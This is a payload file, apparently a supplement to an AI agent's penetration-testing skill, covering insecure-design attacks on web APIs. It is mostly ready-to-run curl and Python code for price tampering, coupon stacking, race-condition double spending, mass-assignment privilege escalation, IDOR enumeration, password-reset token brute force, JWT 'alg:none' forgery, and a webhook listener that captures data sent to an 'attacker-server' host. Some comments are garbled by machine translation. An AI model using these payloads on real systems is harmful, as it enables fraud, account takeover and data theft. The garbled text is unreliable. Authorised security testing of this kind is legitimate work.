# Payloads: notsecure design / Insecure Design

> thisfileis `SKILL.md` Supplementary Files，containsall attackpayloadandtestingcommand。

---

## 1. Business Logic Flaw Testing

### 1.1 Workflow Bypass - Skip Payment to Shipping

```bash
# jumpoverpaymentdirecttuneuseshippinginterface
curl -X POST http://target/api/orders/123/ship \
  -H "Authorization: Bearer $TOKEN"
```

### 1.2 State Machine Illegal Transition

```bash
# from"pending payment"directto"already complete"
curl -X PATCH http://target/api/orders/123 \
  -H "Content-Type: application/json" \
  -d '{"status": "completed"}'
```

### 1.3 Negative Amount Attack

```bash
# 负numberamountattack
curl -X POST http://target/api/transfer \
  -d '{"from": "123", "to": "456", "amount": -1000}'
```

### 1.4 Price Tampering via Hidden Fields

```bash
# modifyhideFieldin price格
curl -X POST http://target/api/checkout \
  -H "Content-Type: application/json" \
  -d '{"item_id": "999", "price": "0.01", "quantity": 1}'
```

### 1.5 Discount Code Reuse / Stack

```bash
# repeatapplicationdiscountcode
curl -X POST http://target/api/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "WELCOME50"}'

# 再timeapplicationsameadiscountcode
curl -X POST http://target/api/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "WELCOME50"}'
```

---

## 2. Rate Limiting Bypass

### 2.1 Verification Code Brute Force

```bash
# continuousrequestverifycodeinterface - Detectspeedratelimitation
for i in $(seq 1 100); do
  curl -s http://target/api/send-sms?phone=13800138000 -o /dev/null -w "%{http_code}\n"
done
```

### 2.2 Login Brute Force Rate Limit Test

```bash
# testinglogininterfacespeedratelimitation
for i in $(seq 1 50); do
  curl -s -X POST http://target/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"pass${i}\"}" \
    -o /dev/null -w "%{http_code}\n"
done
```

### 2.3 Rate Limit Bypass via Header Manipulation

```bash
# use X-Forwarded-For bypassbaseat IP speedratelimitation
for i in $(seq 1 100); do
  curl -s http://target/api/send-sms \
    -H "X-Forwarded-For: 10.0.0.${i}" \
    -d "phone=13800138000" \
    -o /dev/null -w "%{http_code}\n"
done
```

---

## 3. Race Condition Exploitation (Turbo Intruder)

### 3.1 Python Threading Race Condition Script

```python
# Turbo Intruder 风格 concurrentracetesting
import threading
import requests

def race_condition_test(url, payload, threads=50):
    """测试目标 URL 的竞争条件"""
    results = []
    barrier = threading.Barrier(threads)

    def send_request():
        barrier.wait()  # 确保所有线程同时发送
        try:
            r = requests.post(url, json=payload, timeout=10)
            results.append(r.status_code)
        except Exception:
            results.append(None)

    workers = [threading.Thread(target=send_request) for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    success_count = results.count(200)
    print(f"[+] 成功请求数: {success_count}/{threads}")
    if success_count > 1:
        print(f"[!] 疑似 Race Condition 漏洞!")

# Usage Example: librarystoreonlyhas 1 piece，butconcurrentbelowsinglecan cansuccessmultipletime
race_condition_test(
    "http://target/api/buy",
    {"item_id": 1, "quantity": 1},
    threads=50
)
```

### 3.2 Double Spend / Double Withdraw Race

```python
# balanceracecondition - concurrenttransfer耗exhaustivebalance
import threading
import requests

def double_spend_test(account_from, account_to, amount, threads=20):
    """并发转账测试 - 检查余额是否可以被超额消费"""
    url = "http://target/api/transfer"
    payload = {"from": account_from, "to": account_to, "amount": amount}
    results = {"success": 0, "fail": 0, "errors": []}
    lock = threading.Lock()
    barrier = threading.Barrier(threads)

    def transfer():
        barrier.wait()
        try:
            r = requests.post(url, json=payload, timeout=10)
            with lock:
                if r.status_code == 200:
                    results["success"] += 1
                else:
                    results["fail"] += 1
        except Exception as e:
            with lock:
                results["errors"].append(str(e))

    workers = [threading.Thread(target=transfer) for _ in range(threads)]
    for w in workers:
        w.start()
    for w in workers:
        w.join()

    print(f"[+] 成功: {results['success']}, 失败: {results['fail']}")
    if results["success"] > 1:
        print("[!] Race Condition: 余额被多次扣减!")

double_spend_test("user_A", "user_B", 100, threads=20)
```

---

## 4. Mass Assignment Testing

### 4.1 Role Escalation via Mass Assignment

```bash
# registerwhen attemptinjection role/is_admin Field
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "password": "pass123", "email": "test@test.com", "role": "admin"}'

# orupdatepersonalmaterialwhen injectionpermissionField
curl -X PUT http://target/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Test User", "is_admin": true}'
```

### 4.2 Price Override via Mass Assignment

```bash
# createorderwhen attemptcoveringprice格Field
curl -X POST http://target/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 42, "quantity": 1, "price": 0.01}'
```

---

## 5. IDOR Testing

### 5.1 Sequential ID Enumeration

```bash
# traverseorder ID accessitsotheruserorder
for id in $(seq 1 500); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    http://target/api/orders/$id \
    -H "Authorization: Bearer $TOKEN")
  if [ "$code" = "200" ]; then
    echo "[+] Order $id accessible (200)"
  fi
done
```

### 5.2 UUID-Based IDOR

```bash
# attemptaccessitsotheruser resource
curl -s http://target/api/users/$ANOTHER_USER_ID/profile \
  -H "Authorization: Bearer $TOKEN"
```

### 5.3 API Endpoint IDOR - Document Download

```bash
# attemptdownloaditsotheruser documentation
curl -s http://target/api/documents/$DOC_ID/download \
  -H "Authorization: Bearer $TOKEN" \
  -o leaked_doc.pdf
```

---

## 6. Improper Asset Management

### 6.1 Exposed API Documentation

```bash
# checkcommon API documentationpath
for path in /swagger-ui.html /api-docs /v1/api-docs /v2/api-docs /swagger.json /openapi.json /graphql /graphiql; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target${path}")
  if [ "$code" = "200" ]; then
    echo "[+] Found: $path (200)"
  fi
done
```

### 6.2 Staging / Debug Endpoints

```bash
# Detectenvironmentconfigurationleakage
for path in /.env /config.json /debug /actuator /actuator/env /phpinfo.php /server-status; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target${path}")
  if [ "$code" = "200" ]; then
    echo "[+] Found: $path (200)"
  fi
done
```

### 6.3 Old API Version Still Active

```bash
# checkoldversion API iswhether仍然can use
curl -s http://target/api/v1/admin/users -H "Authorization: Bearer $TOKEN"
curl -s http://target/api/v2/admin/users -H "Authorization: Bearer $TOKEN"
curl -s http://target/api/v3/admin/users -H "Authorization: Bearer $TOKEN"
```

---

## 7. Security Misconfiguration Detection

### 7.1 CORS Misconfiguration

```bash
# testingiswhetherallowsarbitrary Origin
curl -s -I http://target/api/data \
  -H "Origin: https://evil.com" | grep -i "access-control-allow"

# testingiswhetheranti射 Origin
curl -s -I http://target/api/data \
  -H "Origin: https://evil.attacker.com" | grep -i "access-control-allow"
```

### 7.2 Verbose Error Messages

```bash
# triggererrorviewiswhetherleakagestackinformation
curl -s http://target/api/users/INVALID_ID_FORMAT
curl -s -X POST http://target/api/login -d '{"username": "a"*10000}'
```

---

## 8. Threat Modeling Test Cases

### 8.1 STRIDE Analysis Checklist

```
对每个系统组件执行以下检查:

S - Spoofing:
   [ ] 能否冒充其他用户？
   [ ] 认证机制是否可靠？
   [ ] Session 管理是否安全？

T - Tampering:
   [ ] 数据在传输中能否被篡改？
   [ ] 数据在存储中能否被篡改？
   [ ] 完整性校验是否存在？

R - Repudiation:
   [ ] 操作是否可抵赖？
   [ ] 审计日志是否完整？
   [ ] 日志是否防篡改？

I - Information Disclosure:
   [ ] 敏感数据是否暴露？
   [ ] 加密是否到位？
   [ ] 错误信息是否泄露敏感数据？

D - Denial of Service:
   [ ] 是否存在资源耗尽风险？
   [ ] 速率限制是否到位？
   [ ] 是否有降级方案？

E - Elevation of Privilege:
   [ ] 能否提权？
   [ ] 权限检查是否一致？
   [ ] 是否存在权限绕过路径？
```

### 8.2 Trust Boundary Defect Checklist

```
常见 trust boundary 缺陷检查:

[ ] 内部 API 无认证（assume internal = trusted）
[ ] 微服务间调用无鉴权
[ ] 管理接口仅靠网络隔离保护
[ ] WebSocket 连接缺少 origin 检查
[ ] 文件上传无类型/大小验证
[ ] 第三方回调无签名验证
[ ] 定时任务无并发控制
[ ] 缓存数据无过期/刷新机制
```

---

## 9. Integer Overflow and Type Confusion

### 9.1 Integer Overflow in Quantity

```bash
# Overflow 32-bit integer to wrap around
curl -X POST http://target/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 2147483647}'

# Overflow to negative via addition
curl -X POST http://target/api/cart/add \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 2147483648}'
```

### 9.2 Type Confusion Attack

```bash
# Send array where string expected
curl -X POST http://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": ["admin"], "password": true}'

# Send object where primitive expected
curl -X POST http://target/api/verify \
  -H "Content-Type: application/json" \
  -d '{"otp": {"$gt": 0}}'
```

---

## 10. Multi-Step Process Abuse

### 10.1 Checkout Flow Manipulation

```python
import requests

s = requests.Session()
s.headers.update({"Authorization": "Bearer TOKEN"})

# Step 1: Add expensive item
s.post("http://target/api/cart/add", json={"id": "premium_item", "qty": 1})

# Step 2: Apply discount (legitimate)
s.post("http://target/api/cart/coupon", json={"code": "SAVE10"})

# Step 3: Replace item with cheap one AFTER discount applied
s.put("http://target/api/cart/items/0", json={"id": "cheap_item", "qty": 1})

# Step 4: Checkout - does discount percentage still apply?
r = s.post("http://target/api/checkout")
print(r.json())
```

### 10.2 Approval Workflow Bypass

```bash
# Submit request and approve it yourself (missing separation of duties)
REQ_ID=$(curl -s -X POST http://target/api/requests \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{"type": "access", "resource": "admin_panel"}' | jq -r '.id')

# Same user approves
curl -X POST "http://target/api/requests/$REQ_ID/approve" \
  -H "Authorization: Bearer $USER_TOKEN"
```

### 10.3 Email Verification Bypass

```bash
# Register without verifying email, access protected features
curl -X POST http://target/api/register \
  -d '{"email":"unverified@test.com","password":"pass123"}'

# Try accessing features that should require verified email
curl http://target/api/premium/content \
  -H "Authorization: Bearer $UNVERIFIED_TOKEN"
```

---

## 11. Insufficient Anti-Automation

### 11.1 CAPTCHA Bypass Testing

```bash
# Test if CAPTCHA is validated server-side
curl -X POST http://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"test","captcha":""}'

# Test if removing captcha field entirely works
curl -X POST http://target/api/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"test"}'

# Test if old/reused captcha tokens accepted
curl -X POST http://target/api/login \
  -d '{"user":"admin","pass":"test","captcha_token":"previously_used_token"}'
```

### 11.2 Account Enumeration via Timing

```python
import requests
import time

users = ["admin", "root", "test", "nonexistent_user_xyz"]
for user in users:
    start = time.time()
    requests.post("http://target/api/login", json={
        "username": user, "password": "wrong"
    })
    elapsed = time.time() - start
    print(f"{user}: {elapsed:.4f}s")
    # Existing users often take longer (password hash comparison)
```

### 11.3 Resource Exhaustion via File Upload

```bash
# Upload oversized file to test limits
dd if=/dev/zero bs=1M count=500 | curl -X POST http://target/api/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@-;filename=large.bin"

# Upload many small files to exhaust storage
for i in $(seq 1 1000); do
  echo "test" | curl -s -X POST http://target/api/upload \
    -F "file=@-;filename=file_$i.txt" -o /dev/null
done
```

---

## 12. Insecure Randomness

### 12.1 Predictable Token Generation

```python
import requests
import re

# Collect multiple tokens to detect patterns
tokens = []
for i in range(20):
    r = requests.post("http://target/api/forgot-password",
                      json={"email": f"test{i}@test.com"})
    token = r.json().get("reset_token", "")
    tokens.append(token)
    print(f"Token {i}: {token}")

# Check for sequential patterns
for i in range(1, len(tokens)):
    if tokens[i] and tokens[i-1]:
        diff = int(tokens[i], 16) - int(tokens[i-1], 16)
        print(f"Diff {i-1}→{i}: {diff}")
```

### 12.2 Session Token Entropy Test

```bash
# Collect 100 session tokens and check entropy
for i in $(seq 1 100); do
  curl -s -c - http://target/login | grep -oP 'session=\K[^;]+' >> tokens.txt
done

# Check uniqueness and length
sort tokens.txt | uniq -d  # Should be empty (no duplicates)
awk '{print length}' tokens.txt | sort -u  # Check consistent length
```

---

## 13. Business Logic Flaws

### 13.1 Coupon Stacking Exploitation

```bash
# Apply multiple coupons to same order (should be limited to one)
curl -X POST http://target/api/cart/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "SAVE20"}'

curl -X POST http://target/api/cart/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "FREESHIP"}'

curl -X POST http://target/api/cart/apply-coupon \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"code": "LOYALTY15"}'

# Check if all discounts applied cumulatively
curl -s http://target/api/cart \
  -H "Authorization: Bearer $TOKEN" | jq '.total_discount'
```

### 13.2 Negative Quantity Order Manipulation

```bash
# Order negative quantity to generate credit
curl -X POST http://target/api/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "item_001", "quantity": -5, "price": 99.99}]}'

# Add negative item alongside positive to reduce total
curl -X POST http://target/api/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": "expensive_item", "quantity": 1}'

curl -X POST http://target/api/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"product_id": "cheap_item", "quantity": -10}'
```

### 13.3 Price Manipulation via API Parameter Tampering

```bash
# Intercept checkout and modify price in request body
curl -X POST http://target/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id": "premium_plan", "price": 0.01, "currency": "USD"}'

# Modify currency to lower-value denomination
curl -X POST http://target/api/payment \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 100, "currency": "IDR"}'  # Indonesian Rupiah instead of USD

# Decimal precision attack
curl -X POST http://target/api/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 0.001, "to": "attacker_account"}'  # Below rounding threshold
```

### 13.4 Referral/Reward System Abuse

```python
import requests

# Self-referral loop to accumulate rewards
def referral_abuse(base_url, token):
    # Create multiple accounts and refer each other
    accounts = []
    for i in range(20):
        r = requests.post(f"{base_url}/api/register", json={
            "email": f"user{i}@tempmail.com",
            "password": "Test123!",
            "referral_code": accounts[-1]["code"] if accounts else "ORIGINAL_CODE"
        })
        accounts.append(r.json())
        print(f"Account {i}: referral bonus = {r.json().get('bonus', 0)}")

    # Check if rewards accumulated on original account
    r = requests.get(f"{base_url}/api/account/rewards",
                     headers={"Authorization": f"Bearer {token}"})
    print(f"Total rewards: {r.json().get('balance', 0)}")
```

### 13.5 Gift Card / Balance Manipulation

```bash
# Transfer gift card balance to self multiple times (race condition + logic flaw)
for i in $(seq 1 10); do
  curl -s -X POST http://target/api/giftcard/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"card_id\": \"GC-12345\", \"to_account\": \"attacker\", \"amount\": 100}" &
done
wait

# Check if balance was deducted only once but credited multiple times
curl -s http://target/api/account/balance -H "Authorization: Bearer $TOKEN"
```

### 13.6 Subscription Tier Bypass

```bash
# Access premium features by manipulating subscription check
curl -s http://target/api/premium/content \
  -H "Authorization: Bearer $FREE_TIER_TOKEN" \
  -H "X-Subscription-Tier: enterprise"

# Downgrade then access cached premium content
curl -X POST http://target/api/subscription/downgrade \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"plan": "free"}'

# Premium content still accessible via direct URL
curl -s http://target/api/reports/premium-analytics \
  -H "Authorization: Bearer $TOKEN"
```

---

## 14. Workflow Bypass

### 14.1 Multi-Step Process Step Skipping

```bash
# Skip email verification step and go directly to account activation
# Normal flow: register → verify email → activate → use
# Attack: register → activate (skip verify)
curl -X POST http://target/api/account/activate \
  -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
  -d '{"activation_code": "bypass"}'

# Skip payment step in order flow
# Normal: cart → address → payment → confirm
# Attack: cart → confirm (skip payment)
curl -X POST http://target/api/orders/confirm \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"order_id": "ORD-12345"}'
```

### 14.2 State Machine Abuse via Parallel Requests

```python
import asyncio
import aiohttp

async def state_machine_abuse(target, token):
    """Exploit state machine by sending conflicting state transitions simultaneously"""
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    async with aiohttp.ClientSession(headers=headers) as session:
        # Send cancel and complete simultaneously
        tasks = [
            session.post(f"{target}/api/orders/123/cancel"),
            session.post(f"{target}/api/orders/123/complete"),
            session.post(f"{target}/api/orders/123/refund"),
        ]
        responses = await asyncio.gather(*tasks)
        for i, resp in enumerate(responses):
            body = await resp.json()
            print(f"Request {i}: status={resp.status} body={body}")
        # If multiple succeed, state machine lacks proper locking

asyncio.run(state_machine_abuse("http://target", "TOKEN"))
```

### 14.3 Approval Workflow Self-Approval

```bash
# Submit a request and approve it with the same account (missing separation of duties)
REQ_ID=$(curl -s -X POST http://target/api/expense-reports \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"amount": 9999, "description": "Equipment"}' | jq -r '.id')

# Attempt self-approval
curl -X POST "http://target/api/expense-reports/$REQ_ID/approve" \
  -H "Authorization: Bearer $TOKEN"

# Attempt approval with role manipulation
curl -X POST "http://target/api/expense-reports/$REQ_ID/approve" \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Role: manager"
```

### 14.4 Password Reset Flow Bypass

```bash
# Request password reset for victim
curl -X POST http://target/api/forgot-password \
  -d '{"email": "victim@company.com"}'

# Attempt to use reset token without receiving email (predictable token)
for token in $(seq 100000 100100); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://target/api/reset-password \
    -d "{\"token\": \"$token\", \"new_password\": \"hacked123\"}")
  [ "$code" = "200" ] && echo "[+] Valid token: $token" && break
done
```

### 14.5 Parallel Request Exploitation for Double Actions

```python
import threading
import requests

def double_withdrawal(url, token, amount):
    """Exploit lack of idempotency in withdrawal endpoint"""
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"amount": amount, "account": "savings"}
    results = []
    barrier = threading.Barrier(10)

    def withdraw():
        barrier.wait()
        r = requests.post(f"{url}/api/withdraw", json=payload, headers=headers)
        results.append({"status": r.status_code, "body": r.json()})

    threads = [threading.Thread(target=withdraw) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    successes = [r for r in results if r["status"] == 200]
    print(f"[*] Successful withdrawals: {len(successes)}")
    if len(successes) > 1:
        print(f"[!] Double withdrawal confirmed! Total extracted: {amount * len(successes)}")

double_withdrawal("http://target", "TOKEN", 500)
```

---

## 15. Trust Boundary Violations

### 15.1 Client-Side Validation Bypass

```bash
# Bypass client-side file type restriction
# Frontend only allows .jpg/.png but server accepts anything
curl -X POST http://target/api/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@malicious.php;type=image/jpeg" \
  -F "filename=innocent.jpg.php"

# Bypass client-side size limit (frontend limits to 5MB, server has no check)
dd if=/dev/urandom bs=1M count=100 | curl -X POST http://target/api/upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@-;filename=large.bin"

# Bypass client-side input length restriction
python3 -c "print('A'*10000)" | curl -X POST http://target/api/profile/bio \
  -H "Authorization: Bearer $TOKEN" \
  -d @-
```

### 15.2 Hidden Field Manipulation

```bash
# Discover hidden fields via HTML source or API response inspection
curl -s http://target/api/products/1 | jq .
# Response reveals: {"id":1, "name":"Widget", "price":99.99, "internal_cost":10.00, "discount_eligible":false}

# Manipulate hidden fields in update request
curl -X PUT http://target/api/products/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Widget", "price": 99.99, "internal_cost": 0.01, "discount_eligible": true}'

# Manipulate hidden user attributes
curl -X PUT http://target/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name": "Normal User", "email_verified": true, "account_type": "premium", "credit_limit": 999999}'
```

### 15.3 Server-Side Trust of Client Data

```bash
# Server trusts client-provided user ID without verification
curl -X POST http://target/api/actions/delete-account \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "victim_user_id", "confirmation": true}'

# Server trusts client-provided role in JWT without signature verification
# Decode JWT, modify role, re-encode without signature
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"attacker","role":"admin","iat":1700000000}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s http://target/api/admin/users \
  -H "Authorization: Bearer ${HEADER}.${PAYLOAD}."
```

### 15.4 Internal API Exposure Without Authentication

```bash
# Discover internal APIs exposed without auth (trust boundary between internal/external)
for port in 8080 8443 9090 3000 5000 8000; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target:${port}/internal/api/health" --max-time 3)
  [ "$code" = "200" ] && echo "[+] Internal API exposed on port $port"
done

# Access internal microservice endpoints directly
curl -s http://target/internal/user-service/admin/list-all
curl -s http://target/internal/payment-service/transactions?limit=1000
curl -s http://target/internal/config-service/secrets
```

### 15.5 Webhook and Callback Trust Exploitation

```python
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

class CallbackCapture(BaseHTTPRequestHandler):
    captured = []
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        self.captured.append(body.decode())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')
    def log_message(self, format, *args):
        pass

# Start callback server
server = HTTPServer(('0.0.0.0', 9999), CallbackCapture)
threading.Thread(target=server.serve_forever, daemon=True).start()

# Register malicious webhook to capture internal data
r = requests.post("http://target/api/webhooks", json={
    "url": "http://attacker-server:9999/capture",
    "events": ["user.created", "payment.completed", "order.shipped"]
})
print(f"Webhook registered: {r.json()}")

# Trigger events and capture data sent to webhook
# Server trusts webhook URL without validation of destination
```

### 15.6 GraphQL Depth and Complexity Abuse

```bash
# Deeply nested query to exhaust server resources (no depth limiting)
curl -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ users { friends { friends { friends { friends { friends { name email } } } } } } }"}'

# Alias-based batching to bypass rate limits
curl -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ a1: user(id:1){email} a2: user(id:2){email} a3: user(id:3){email} a4: user(id:4){email} a5: user(id:5){email} a6: user(id:6){email} a7: user(id:7){email} a8: user(id:8){email} a9: user(id:9){email} a10: user(id:10){email} }"}'
```
